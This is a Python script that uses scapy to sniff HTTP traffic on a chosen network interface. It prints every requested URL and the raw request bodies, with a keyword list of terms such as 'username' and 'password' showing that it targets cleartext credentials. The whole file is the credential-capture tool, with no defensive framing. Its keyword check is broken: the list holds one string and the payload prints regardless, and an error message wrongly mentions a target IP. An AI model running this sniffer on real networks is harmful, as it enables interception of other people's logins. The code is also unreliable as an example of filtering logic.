import scapy.all as scapy
import optparse
from scapy.layers import http

def getArgs():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Input your interface.")
    (opt, arg) = parser.parse_args()
    if not opt.interface:
        parser.error("[-] Please specify an targetIp. Use --help for information.")

    return opt


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processPacket)

def processPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username, user, usr, login, password, pass, pswd"]
            for keyword in keywords:
                print(load)
                break

opt = getArgs()
sniff(opt.interface)
